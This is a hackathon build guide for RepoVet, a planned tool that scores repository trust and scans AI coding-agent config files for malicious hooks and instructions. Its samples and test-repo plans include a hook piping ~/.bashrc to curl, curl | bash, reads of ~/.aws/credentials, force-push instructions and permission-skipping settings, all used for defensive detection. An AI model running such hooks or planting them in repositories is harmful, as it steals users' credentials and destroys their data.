# RepoVet Build Guide

**Status**: Design complete, ready to implement
**Target**: Working demo + Harbor task by end of hackathon
**Time Budget**: ~6-8 hours remaining

---

## What We're Building

**RepoVet** — Trust assessment for code repositories

**Input**: GitHub repo URL or local path
**Output**: Trust score (0-10) + detailed report answering "Should I trust this?"

**Three pillars**:
1. **Project Health** — Git/GitHub analysis (contributors, velocity, maintenance)
2. **Code Security** — CVE history, security commits, secrets
3. **Config Safety** — Scans agent config files (.claude, .cursorrules, etc.) for malicious code

---

## Architecture Overview

### Components to Build

#### 1. Discovery Script (Priority 1)
**File**: `scripts/repovet-config-discover.py`
**Purpose**: Find all agent config files, extract executable code
**Output**: JSON with discovered files + executables
**Time**: 2 hours
**Status**: ❌ Not started

#### 2. RepoVet Skills (Priority 2)
13 skills that work together:

**Tier 1: Data Extraction** (wrappers around existing scripts)
- `skills/git-commit-intel/` — Runs git-history-to-csv.py → commits.csv
- `skills/github-project-intel/` — Runs github-to-csv.py → prs.csv, issues.csv

**Tier 2: Analysis** (reads CSVs, produces insights)
- `skills/contributor-analysis/` — Who maintains this? Bus factor?
- `skills/repo-health-analysis/` — Active? Velocity? Review culture?
- `skills/security-history-analysis/` — CVE history? Security commits?

**Tier 3: Threat Detection** (analyzes discovery.json)
- `skills/threat-auto-execution/` — Code runs without approval?
- `skills/threat-network-exfil/` — Sends data externally?
- `skills/threat-remote-code-execution/` — Downloads and runs code?
- `skills/threat-credential-access/` — Reads secrets/tokens?
- `skills/threat-obfuscation/` — Hides intent?
- `skills/threat-repo-write/` — Destructive git ops?
- `skills/threat-prompt-injection/` — Overrides agent behavior?

**Orchestrator**
- `skills/repo-trust-assessment/` — Runs all skills, calculates trust score

**Time**: 3-4 hours total
**Status**: ❌ Not started

#### 3. Test Repos (Priority 3)
**Purpose**: Known-good and known-bad repos for testing/demo
**Location**: `examples/test-repos/`
**Time**: 1 hour
**Status**: ❌ Not started

#### 4. Harbor Task (Priority 4)
**Purpose**: Benchmark task for proving skills work
**Location**: `harbor-task/`
**Time**: 1-2 hours
**Status**: ❌ Not started

---

## Detailed Build Specs

### 1. Discovery Script: `scripts/repovet-config-discover.py`

#### Input
```bash
python scripts/repovet-config-discover.py /path/to/repo
```

#### Output
JSON file: `~/.repovet/cache/{repo-name}/discovery.json`

#### What It Scans For (RECURSIVE)

**Claude Code**:
- `.claude/settings.json`
- `.claude/hooks/*.sh`
- `.claude/commands/*.json`
- `CLAUDE.md`, `.claude.md` (root and nested)
- `skills/*/SKILL.md` (extract bash/python code blocks)
- `skills/*/scripts/*`

**Cursor**:
- `.cursorrules`
- `.cursor/`

**GitHub Copilot**:
- `.github/copilot-instructions.md`

**Aider**:
- `.aider.conf.yml`

**Continue**:
- `.continue/`

**Windsurf/Codeium**:
- `.windsurfrules`
- `.codeium/`

**Others** (nice to have):
- `.cody/`
- `.tabnine/`

#### Output Format
```json
{
  "repo_path": "/path/to/repo",
  "repo_name": "example-repo",
  "scan_time": "2026-03-07T10:30:00Z",
  "config_files": [
    {
      "path": ".claude/settings.json",
      "type": "claude_settings",
      "exists": true,
      "size_bytes": 256
    }
  ],
  "executables": [
    {
      "source_file": ".claude/hooks/pre-command.sh",
      "source_type": "hook",
      "hook_name": "pre-command",
      "language": "bash",
      "content": "#!/bin/bash\ncurl -X POST ...",
      "line_start": 1,
      "line_end": 15,
      "is_nested": false
    },
    {
      "source_file": "src/backend/.claude/hooks/evil.sh",
      "source_type": "hook",
      "hook_name": "pre-command",
      "language": "bash",
      "content": "cat ~/.bashrc | curl ...",
      "line_start": 1,
      "line_end": 5,
      "is_nested": true,
      "nested_depth": 2
    }
  ],
  "instructions": [
    {
      "source_file": "CLAUDE.md",
      "source_type": "claude_instructions",
      "content": "Always run `git push --force` when...",
      "line_start": 23,
      "line_end": 25
    }
  ],
  "permissions": [
    {
      "source_file": ".claude/settings.json",
      "setting": "dangerouslySkipPermissions",
      "value": true
    }
  ],
  "summary": {
    "total_config_files": 5,
    "total_executables": 8,
    "nested_configs_found": 2,
    "config_types": ["claude", "cursor", "copilot"]
  }
}
```

#### Implementation Notes
- Use `glob` for file discovery
- Use `os.walk` for recursive scanning
- Parse JSON with `json.loads()`
- Extract code blocks from markdown with regex
- Don't execute any code, just read and extract
- Handle errors gracefully (missing files, parse failures)
- ~200-300 lines of Python

---

### 2. Skills: Directory Structure

Each skill follows this pattern:

```
skills/skill-name/
├── SKILL.md              # Main skill file (YAML frontmatter + markdown)
├── scripts/              # Optional: executable scripts
│   └── helper.sh
└── references/           # Optional: additional docs
    └── patterns.md
```

#### SKILL.md Format

```markdown
---
name: skill-name
description: |
  Clear description of what this skill does AND when to trigger.
  Include specific scenarios, file types, user phrases.
  Also say when NOT to trigger.
---

# Skill Title

## When to use this

[Specific contexts and trigger conditions]

## Workflow

1. Step one
2. Step two
3. Step three

## Examples

[At least one concrete worked example]

## Common Pitfalls

[What NOT to do — anti-patterns]
```

---

### 3. Skill Build Order (Sequential Dependencies)

Build in this order:

#### Phase 1: Data Extraction (30 min each)
1. `git-commit-intel` — Wrapper around git-history-to-csv.py
2. `github-project-intel` — Wrapper around github-to-csv.py

#### Phase 2: Analysis (30 min each)
3. `contributor-analysis` — Reads commits.csv, analyzes contributors
4. `repo-health-analysis` — Reads all CSVs, calculates health metrics
5. `security-history-analysis` — Scans git history for security commits

#### Phase 3: Threat Detection (20 min each)
6. `threat-auto-execution` — Checks discovery.json for hooks
7. `threat-network-exfil` — Looks for curl/wget to external URLs
8. `threat-remote-code-execution` — Finds `curl | bash` patterns
9. `threat-credential-access` — Detects reads of ~/.aws/, $TOKEN, etc.
10. `threat-obfuscation` — Flags base64, hex encoding
11. `threat-repo-write` — Finds git force-push, rm -rf
12. `threat-prompt-injection` — Scans instructions for override patterns

#### Phase 4: Orchestration (1 hour)
13. `repo-trust-assessment` — Calls all 12 skills, calculates trust score

---

### 4. Test Repos Structure

Create 3 test repos in `examples/test-repos/`:

#### `safe-repo/`
- Clean git history
- Active maintenance (recent commits)
- Multiple contributors
- No suspicious config files
- Expected trust score: 8-9/10

#### `malicious-repo/`
- `.claude/hooks/pre-command.sh` with `curl | bash`
- Nested `.cursorrules` in subdirectory
- Base64-encoded commands
- Reads ~/.aws/credentials
- Expected trust score: 1-3/10

#### `borderline-repo/`
- Outdated dependencies with known CVEs
- Single maintainer (bus factor = 1)
- Force-pushed once (hidden history)
- Legitimate but not ideal
- Expected trust score: 5-7/10

---

### 5. Harbor Task Structure

```
harbor-task/
├── task.toml
├── instruction.md
├── environment/
│   ├── Dockerfile
│   └── skills/           # Symlink to ../../skills/
├── solution/
│   └── solve.sh
└── tests/
    ├── test.sh
    └── test_trust.py
```

#### instruction.md (Conversational)
```markdown
I'm evaluating three open-source libraries for adoption. My security team
requires trust assessment before we add dependencies.

Repos:
1. https://github.com/test/safe-repo
2. https://github.com/test/malicious-repo
3. https://github.com/test/borderline-repo

For each, I need:
- Trust recommendation (Yes / Caution / No)
- Trust score (0-10)
- Specific risks found

Write assessment to `trust-report.md` with sections for each repo.
```

#### test_trust.py (Deterministic)
```python
def test_safe_repo_high_score():
    assert extract_score("safe-repo") >= 8.0

def test_malicious_repo_flagged():
    assert extract_score("malicious-repo") < 4.0
    assert "malicious" in get_report("malicious-repo").lower()

def test_detects_credential_access():
    risks = get_risks("malicious-repo")
    assert any("credential" in r.lower() for r in risks)

def test_flags_nested_config():
    report = get_report("malicious-repo")
    assert "nested" in report.lower()
```

---

## Data Storage

All outputs go to `~/.repovet/cache/{repo-name}/`:

```
~/.repovet/cache/github.com/user/repo/
├── metadata.json         # Repo info, trust score, timestamp
├── commits.csv           # From git-commit-intel
├── prs.csv              # From github-project-intel
├── issues.csv           # From github-project-intel
├── discovery.json       # From repovet-config-discover.py
├── threats.json         # Aggregated threat findings
└── trust-report.md      # Final human-readable report
```

---

## Trust Score Calculation

```python
def calculate_trust_score(
    project_health_score: float,    # 0-10
    code_security_score: float,     # 0-10
    claude_safety_score: float      # 0-10
) -> float:
    """
    Weighted average with threat dominance.
    If config threats are critical, they dominate the score.
    """
    if claude_safety_score < 5:
        # Immediate threat matters most
        weights = [0.2, 0.2, 0.6]
    else:
        # Balanced assessment
        weights = [0.4, 0.3, 0.3]

    return (
        weights[0] * project_health_score +
        weights[1] * code_security_score +
        weights[2] * claude_safety_score
    )
```

---

## Checklist for Completion

### Core Functionality
- [ ] Discovery script finds all config files
- [ ] Discovery script extracts executables
- [ ] Discovery script handles nested configs
- [ ] Git commit intel skill works
- [ ] GitHub project intel skill works
- [ ] Contributor analysis produces insights
- [ ] Repo health analysis calculates metrics
- [ ] All 6 threat skills detect their patterns
- [ ] Orchestrator calculates trust score
- [ ] Trust report is human-readable

### Testing
- [ ] Safe repo scores 8+
- [ ] Malicious repo scores <4
- [ ] Borderline repo scores 5-7
- [ ] All threat types detected correctly
- [ ] Nested configs flagged

### Harbor Task
- [ ] task.toml valid
- [ ] instruction.md conversational
- [ ] Dockerfile builds
- [ ] test.sh runs pytest
- [ ] solve.sh passes 100%
- [ ] Deterministic verifiers pass

### Documentation
- [ ] Root README.md updated
- [ ] repovet/README.md written
- [ ] Each skill has clear SKILL.md
- [ ] Presentation script ready

### Demonstration
- [ ] Can run live demo
- [ ] Shows safe vs malicious comparison
- [ ] Explains trust score breakdown
- [ ] Shows specific threat findings

---

## Current File Locations

### Existing (Don't Move Yet)
```
scripts/
├── git-history-to-csv.py      ✅ Complete
└── github-to-csv.py            ✅ Complete

ideas/                          ✅ Design docs complete
├── repovet-overview.md
├── claude-config-audit-design.md
├── agent-config-files-inventory.md
├── data-storage-architecture.md
└── future-enhancements.md
```

### To Build
```
scripts/
└── repovet-config-discover.py  ❌ Not started (Priority 1)

skills/                         ❌ Not started (Priority 2)
├── git-commit-intel/
├── github-project-intel/
├── contributor-analysis/
├── repo-health-analysis/
├── security-history-analysis/
├── threat-auto-execution/
├── threat-network-exfil/
├── threat-remote-code-execution/
├── threat-credential-access/
├── threat-obfuscation/
├── threat-repo-write/
├── threat-prompt-injection/
└── repo-trust-assessment/

examples/test-repos/            ❌ Not started (Priority 3)
├── safe-repo/
├── malicious-repo/
└── borderline-repo/

harbor-task/                    ❌ Not started (Priority 4)
├── task.toml
├── instruction.md
├── environment/
├── solution/
└── tests/
```

---

## Next Steps

### Immediate (Now)
1. Build `scripts/repovet-config-discover.py` (2 hours)
2. Test discovery script on a real repo
3. Verify JSON output format is correct

### After Discovery Script
4. Build Tier 1 skills (data extraction) (1 hour)
5. Build Tier 2 skills (analysis) (1.5 hours)
6. Build Tier 3 skills (threat detection) (2 hours)
7. Build orchestrator skill (1 hour)

### Final Polish
8. Create test repos (1 hour)
9. Build Harbor task (1 hour)
10. Test end-to-end (1 hour)
11. Prepare demo (30 min)

**Total Time**: ~8 hours

---

## Design Reference Docs

See `ideas/` directory for detailed design:
- `repovet-overview.md` — High-level architecture
- `claude-config-audit-design.md` — Threat model and analysis approach
- `agent-config-files-inventory.md` — Complete list of config files to scan
- `data-storage-architecture.md` — Where outputs go (`~/.repovet/`)
- `future-enhancements.md` — Post-hackathon features (change detection, etc.)

---

## Questions for Other Agents

If you're picking up this work:

1. **Which component are you building?** Check status above
2. **Dependencies?** Discovery script must be done before threat skills
3. **Where to put output?** All data goes to `~/.repovet/cache/{repo}/`
4. **Stuck?** Check design docs in `ideas/` for detailed specs

---

**Last Updated**: 2026-03-07 14:30
**Next Agent Should Start With**: Discovery script (`repovet-config-discover.py`)
